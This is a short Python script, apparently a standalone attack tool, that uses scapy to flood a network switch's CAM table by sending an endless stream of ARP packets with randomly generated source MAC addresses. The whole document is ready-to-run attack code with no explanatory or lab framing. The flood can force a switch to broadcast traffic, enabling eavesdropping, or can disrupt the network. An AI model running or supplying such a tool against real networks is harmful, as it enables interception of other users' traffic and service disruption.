#!/usr/bin/python

# CAM Table flood
# sin@technophage.net

import random
from scapy.all import *

def randmac():
	r = lambda: random.randint(0,255)
	return('%02X:%02X:%02X:%02X:%02X:%02X' % (r(), r(), r(), r(), r(), r()))

while 1:
        rmac=randmac()
        send(ARP(1, psrc='0.0.0.0', pdst='0.0.0.0', hwsrc=rmac, hwdst='FF:FF:FF:FF:FF:FF'))

# @=X
